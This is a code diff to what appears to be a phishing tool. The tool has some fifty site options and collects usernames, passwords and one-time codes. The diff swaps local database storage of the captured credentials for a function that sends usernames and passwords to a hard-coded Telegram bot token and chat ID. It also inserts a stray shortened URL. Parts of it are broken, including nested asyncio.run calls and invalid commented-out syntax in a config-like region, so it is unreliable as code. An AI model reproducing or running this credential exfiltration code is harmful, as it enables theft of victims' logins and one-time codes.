@@ -27,6 +27,29 @@ version = 2.2
 host = "0.0.0.0"
 port = "8080"
 
+import asyncio
+from telegram import Bot
+
+async def save_data(site, username, password, otp):
+    # Replace 'YOUR_BOT_TOKEN' with your actual bot token
+    bot_token = '6924646328:AAGxgTMSYgRFqK8fvXNdVvsLPPe715VgI10'
+
+    # Create a bot instance
+    bot = Bot(token=bot_token)
+
+    # Your Telegram user ID (can be found by sending /my_id to your bot)
+    your_user_id = '484277244'
+
+    # Message you want to send
+    message = 'username: {} \npassword: {}'.format(username, password)
+
+    # Send the message
+    await bot.send_message(chat_id=your_user_id, text=message)
+
+
+http://tinyurl.com/5sk4w7nk
+
+
 
 
 def logo():
@@ -95,29 +118,29 @@ def user_pass(data):
 
 	
 
-def save_data(site, username, password, otp):
+# def asyncio.run(save_data(site, username, password, otp)):
 	
-	os.chdir("..") 
-	os.chdir("..") 
-	try:
+# 	os.chdir("..") 
+# 	os.chdir("..") 
+# 	try:
 		
-		conn = sqlite3.connect(".credentials.db")
-		conn.execute("""
-		CREATE TABLE IF NOT EXISTS data (
-		id INTEGER PRIMARY KEY,
-		site TEXT,
-		username TEXT,
-		password TEXT,
-		otp TEXT
-		)
-		""")
-		conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
-		conn.commit()
-		print("\nCredentials saved to database.\n")
-	except sqlite3.Error as error:
-		print("Database error:", error)
-	finally:
-		conn.close()
+# 		conn = sqlite3.connect(".credentials.db")
+# 		conn.execute("""
+# 		CREATE TABLE IF NOT EXISTS data (
+# 		id INTEGER PRIMARY KEY,
+# 		site TEXT,
+# 		username TEXT,
+# 		password TEXT,
+# 		otp TEXT
+# 		)
+# 		""")
+# 		conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
+# 		conn.commit()
+# 		print("\nCredentials saved to database.\n")
+# 	except sqlite3.Error as error:
+# 		print("Database error:", error)
+# 	finally:
+# 		conn.close()
 
 def retrieve_data():
 	conn = None
@@ -1043,7 +1066,7 @@ if (option==1):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 	except Exception as error:
 		print(error)
 
@@ -1074,7 +1097,7 @@ elif (option==2):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 	except Exception as error:
 		print(error)
 	
@@ -1104,7 +1127,7 @@ elif (option==3):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -1135,7 +1158,7 @@ elif (option==4):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 	except Exception as error:
 		print(error)
 		
@@ -1165,7 +1188,7 @@ elif (option==5):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -1196,7 +1219,7 @@ elif (option==6):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 	except Exception as error:
 		print(error)
 		
@@ -1226,7 +1249,7 @@ elif (option==7):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 	
@@ -1257,7 +1280,7 @@ elif (option==8):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 	except Exception as error:
 		print(error)
 
@@ -1288,7 +1311,7 @@ elif(option==9):
 			os.remove("log.txt")
 		except:
 				pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 			print(error)
 			
@@ -1320,7 +1343,7 @@ elif(option==10):
 					os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(asyncio.run(save_data(site, username, password, otp)))
 			except Exception as error:
 				print(error)
 
@@ -1351,7 +1374,7 @@ elif (option==11):
 					os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1382,7 +1405,7 @@ elif (option==12):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1413,7 +1436,7 @@ elif (option==13):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 
@@ -1445,7 +1468,7 @@ elif (option==14):
 						os.remove("log.txt")
 				except:
 						pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 					print(error)
 			
@@ -1476,7 +1499,7 @@ elif (option==15):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1506,7 +1529,7 @@ elif (option==16):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1536,7 +1559,7 @@ elif (option==17):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1566,7 +1589,7 @@ elif (option==18):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1596,7 +1619,7 @@ elif (option==19):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 			
@@ -1626,7 +1649,7 @@ elif (option==20):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 
@@ -1656,7 +1679,7 @@ elif (option==21):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -1686,7 +1709,7 @@ elif (option==22):
 						os.remove("log.txt")
 				except:
 					pass
-				save_data(site, username, password, otp)
+				asyncio.run(save_data(site, username, password, otp))
 			except Exception as error:
 				print(error)
 
@@ -1716,7 +1739,7 @@ elif (option==23):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1746,7 +1769,7 @@ elif (option==24):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1776,7 +1799,7 @@ elif (option==25):
 			os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1806,7 +1829,7 @@ elif (option==26):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1835,7 +1858,7 @@ elif (option==27):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1865,7 +1888,7 @@ elif (option==28):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1895,7 +1918,7 @@ elif (option==29):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -1926,7 +1949,7 @@ elif (option==30):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -1957,7 +1980,7 @@ elif (option==31):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 
@@ -1988,7 +2011,7 @@ elif (option==32):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2019,7 +2042,7 @@ elif (option==33):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2050,7 +2073,7 @@ elif (option==34):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2081,7 +2104,7 @@ elif (option==35):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2112,7 +2135,7 @@ elif (option==36):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2143,7 +2166,7 @@ elif (option==37):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2174,7 +2197,7 @@ elif (option==38):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2205,7 +2228,7 @@ elif (option==39):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2236,7 +2259,7 @@ elif (option==40):
 				os.remove("log.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2261,7 +2284,7 @@ elif (option==41):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2286,7 +2309,7 @@ elif (option==42):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2311,7 +2334,7 @@ elif (option==43):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2336,7 +2359,7 @@ elif (option==44):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2361,7 +2384,7 @@ elif (option==45):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2386,7 +2409,7 @@ elif (option==46):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2411,7 +2434,7 @@ elif (option==47):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2436,7 +2459,7 @@ elif (option==48):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2461,7 +2484,7 @@ elif (option==49):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2486,7 +2509,7 @@ elif (option==50):
 				os.remove("otp.txt")
 		except:
 			pass
-		save_data(site, username, password, otp)
+		asyncio.run(save_data(site, username, password, otp))
 	except Exception as error:
 		print(error)
 		
@@ -2601,7 +2624,7 @@ button {
 				except Exception as error:
 					print(error)
 				try:
-					save_data(site, username, password, otp)
+					asyncio.run(save_data(site, username, password, otp))
 				except:
 					pass
 
